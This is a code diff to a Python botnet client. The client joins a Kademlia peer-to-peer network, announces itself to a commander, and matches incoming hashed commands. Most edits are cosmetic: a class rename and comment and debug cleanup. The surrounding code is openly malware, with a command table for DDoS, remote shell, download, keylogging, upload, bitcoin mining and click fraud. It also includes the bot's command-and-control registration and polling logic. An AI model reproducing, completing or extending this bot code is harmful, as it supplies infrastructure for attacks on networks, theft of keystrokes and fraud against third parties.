@@ -14,7 +14,7 @@ formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(messag
 handler.setFormatter(formatter)
 log = logging.getLogger('kademlia')
 log.addHandler(handler)
-#log.setLevel(logging.DEBUG) #DEBUG
+#log.setLevel(logging.DEBUG) #DEBUG - Remove line to turn on debugging
 
 
 if len(sys.argv) != 4:
@@ -40,7 +40,7 @@ def most_common(list):
     return data.most_common(1)[0][0]
 
 #Bot class that holds network, and bot information 
-class botnode:
+class Botnode:
     def __init__(self, ip, port, network_id, cmdhash):
         self._ip = ip
         self._port = port
@@ -49,7 +49,7 @@ class botnode:
         #self._cmdque = asyncio.Queue() #TODO use for querying multiple commands at once.
         # this will store all the child processes that are started
         self._pgroup = []
-        #This should be populated from a seperate file then encrytped
+        #This should be populated from a seperate file then decrytped
         self._cmdsrun = {'DDOS': False, 'SHELL': False, 'DOWNLOAD': False,
                         'KEYLOG': False, 'UPLOAD': False, 'BITCOIN': False,
                         'CLICKFRAUD': False, 'HELLO': False}
@@ -66,7 +66,6 @@ Return to wait_cmd() loop and check for new commands
 async def get_cmd(value, sever, bot):
     #The bot needs to check the recived command ID (hashed) from the commander, then sets its value to true and performs the works
     hashcmds = [get_hash(command) for command in bot._cmdsrun.keys()] #Create a list of the hash IDs for commands (ie. SHA1 digest of 'HELLO')
-    #print("\nTrying to find {} in {}\n".format(value,hashcmds)) #Debug print statement
     """ Ideally the commands should not be stored but pulled from another source
     def run_cmd(cmd):
         decrypt(cmd)
@@ -75,7 +74,6 @@ async def get_cmd(value, sever, bot):
             tmp = 'python {} {}'.format(cmd)
     """
     try:
-        
         args = value.split()
         cnt = len(args) # parse out the command count
         #cnt=len(args)
@@ -124,12 +122,8 @@ async def get_cmd(value, sever, bot):
     except Exception as e:
         #log.error()
         print("\nCaught Exception {}".format(e)) #log.error(msg)
-        print("We errored out trying to match command {} {}\n".format(type(cmd),cmd)) #log.error()
+        print("We errored out trying to match command {} {}\n".format(type(value),value)) #log.error()
         pass
-    # pdb.set_trace()
-    # After running command set 
-    #await server.set(bot._cmdkey)
-    # await wait_cmd(server, bot)
 
 """
 Query the network for any store requests with the _cmdkey of our node
@@ -160,9 +154,7 @@ callhome -> Checks to see if a node has already joined the network
 If node is not apart of network then join [set()] with the Network Key and ID value of bot
 otherwise wait for commands: wait_cmd()
 """
-#TODO: Fix the loop that call home creates, calling recusivly either callhome() or wait_cmd() until program runs out of memory
 async def callhome(server, bot):
-    ##NOTE KEY initialized at start of loop, no need to create here
     # announce to Shepard that we exist, then check for ack
     nodeId = await server.get(NETKEY)
     if nodeId != str(bot._id) or nodeId is None:
@@ -173,10 +165,7 @@ async def callhome(server, bot):
     else:    
         print("\nWe have an ack\nNode: {}\nJoined: {}\n"
         .format(nodeId,NETKEY))
-        #await wait_cmd(server,bot)
 
-
-##TODO:DONE - Confirm if idhash == network key, confirm from debug traces looks like NodeID might be getting set as KEY on network. 
 """
 Initialize IP
 CMDhash = Lookup ID for commands on network
@@ -187,12 +176,11 @@ async def setup(server):
     myip = get_ip_address()
     # the UUID for bot to check if commands are ready, is a hash of the node_id. 
     cmdhash = get_hash(str(server.node.long_id))
-    #Create botnode with Its IP, Port, Bot ID, and command hash
-    bot = botnode(myip, myport, str(server.node.long_id), cmdhash)
+    #Create Botnode with Its IP, Port, Bot ID, and command hash
+    bot = Botnode(myip, myport, str(server.node.long_id), cmdhash)
 
     print("\nParams: NETWORK_KEY: {}\nIP: {}\nNODE_ID: {}\nCOMMAND KEY: {}"
         .format(NETKEY, myip, server.node.long_id, cmdhash))
-    #print("\nBOT CREATED?: CHECK THESE VARS:\n{}\n\n".format(vars(bot)))
     #pdb.set_trace()
     await callhome(server, bot)
     # Once callhome returns successfully then the populated bot class will be returned. Allows driving event loop to keep track of information on the bot
